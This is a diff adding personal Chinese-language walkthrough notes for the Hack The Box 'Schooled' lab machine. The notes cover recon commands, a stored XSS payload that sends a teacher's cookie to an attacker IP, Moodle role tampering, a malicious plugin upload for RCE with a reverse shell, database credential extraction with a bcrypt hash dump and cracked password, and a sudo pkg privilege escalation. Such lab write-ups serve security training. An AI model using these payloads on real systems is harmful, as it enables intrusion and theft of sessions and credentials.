@@ -1,0 +1,111 @@
+nmap -sV -sC -Pn 10.129.161.78 > nmap.txt
+nmap -p- 10.129.161.78 -T5 > nmapall.txt
+nikto -h http://schooled.htb > nikto.txt
+
+
+
+gobuster dir  -u http://schooled.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x txt,php > gobuster.txt
+
+admissions@schooled.htb
+phillips_manuel@staff.schooled.htb
+1.nmap掃描後有80及22端口
+2.使用ffuf檢測主機頭,發現有moodle
+/opt/ffuf/ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H 'Host: FUZZ.schooled.htb' -fs 20750
+wfuzz -c -z range,0-50  http://moodle.schooled.htb/moodle/user/profile.php?id=FUZZ
+3.登入moodle.schooled.htb後可以註冊帳號登入後台
+4.設置個人資訊,設置moodleNet字段為XXS攻擊字段
+<img src=x onerror=this.src='http://10.10.14.45/?'+document.cookie;>
+5.進入到Math課程Enroll課程後,老師會查Enroll學生的moodleNet,取得老師的cookie
+fvd5qgocgbp0vaerre5eljoaia
+6.更換cookie後可以以老師的帳號操作後台,在Math課程中添加學生進到課程，可以抓取中的請求
+7.修改請求中的字段userid=24是老師ID,role=1是課程管理員角色,將timmy角色改成manager
+userlist=24&roletoassign=1
+8.將Lianne Carter 加入課程,網頁上顯示Lianne manger
+9.點擊Lianne profile可以找到 login as 成功取得後台配置管理權限
+10.提昇管理權限,在site administration-user-Define roles-save changes,抓取post請求
+11.將請求內的參數替換掉,重新請求,可以將取得更高權限,操作plugin功能
+12.上傳rce.zipl後訪問以下地址取得remode code execution
+http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
+13.將zip檔解壓縮後,修改裡面php成reverse.php後壓縮
+zip -r myfile.zip ./*
+14.注意機器是freeBSD,shell要指定/bin/sh
+15.在以下路徑可以找到config.php內有mysql帳密
+/usr/local/www/apache24/data/moodle
+16.查找到mdl_user表內有username,user,password,破解出Jamie的來密碼!QAZ2wsx
+17.登入Jamie發現有sudo權限  (ALL) NOPASSWD: /usr/sbin/pkg install *
+18.生成reverse shell 的安裝檔案root-1.0.txz (注意BSD的shell使用netBSD reverse shell)
+fpm -n root -s dir -t freebsd -a all --before-install /home/kali/timmy/hackthebox/Schooled/root.sh /home/kali/timmy/hackthebox/Schooled
+19.根據gtfobins使用pkg sudo提權
+sudo /usr/sbin/pkg install -y -no-repo-update ./root-1.0.txz
+
+
+
+mysql -u dmoodle  -pPlaybookMaster2020 -e 'show databases;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'show databases;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle;show tables;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle; select username,firstname,lastname,password from mdl_user;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle; select id,username,password from mdl_user;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user_password_history;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user_password_resets;'
+/usr/local/bin/mysql -umoodle  -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user_private_key;'
+
+$CFG->dbtype    = 'mysqli';
+$CFG->dblibrary = 'native';
+$CFG->dbhost    = 'localhost';
+$CFG->dbname    = 'moodle';
+$CFG->dbuser    = 'moodle';
+$CFG->dbpass    = 'PlaybookMaster2020';
+$CFG->prefix    = 'mdl_';
+$CFG->dboptions = array (
+  'dbpersist' => 0,
+  'dbport' => 3306,
+  'dbsocket' => '',
+  'dbcollation' => 'utf8_unicode_ci',
+
+
+
+mdl_user_enrolments
+mdl_user
+mdl_user_info_category
+mdl_user_info_data
+mdl_user_devices
+mdl_user_info_field
+mdl_user_lastaccess
+mdl_user_password_history
+mdl_user_password_resets
+mdl_user_preferences
+mdl_user_private_key
+
+username        firstname       lastname        password
+guest   Guest user              $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
+admin   Jamie   Borham  $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
+bell_oliver89   Oliver  Bell    $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
+orchid_sheila89 Sheila  Orchid  $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
+chard_ellzabeth89       Elizabeth       Chard   $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
+morris_jake89   Jake    Morris  $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
+heel_james89    James   Heel    $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
+nash_michael89  Michael Nash    $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu
+singh_rakesh89  Rakesh  Singh   $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu
+taint_marcus89  Marcus  Taint   $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa
+walls_shaun89   Shaun   Walls   $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga
+smith_john89    John    Smith   $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em
+white_jack89    Jack    White   $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK
+travis_carl89   Carl    Travis  $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S
+mac_amy89       Amy     Mac     $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i
+james_boris89   Boris   James   $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
+pierce_allan    Allan   Pierce  $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy
+henry_william89 William Henry   $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu
+harper_zoe89    Zoe     Harper  $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy
+wright_travis89 Travis  Wright  $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm
+allen_matthew89 Matthew Allen   $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq
+sanders_wallis89        Wallis  Sanders $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u
+higgins_jane    Jane    Higgins $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
+phillips_manuel Manuel  Phillips        $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
+carter_lianne   Lianne  Carter  $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
+parker_dan89    Dan     Parker  $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi
+parker_tim89    Tim     Parker  $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S
+
+
+
+
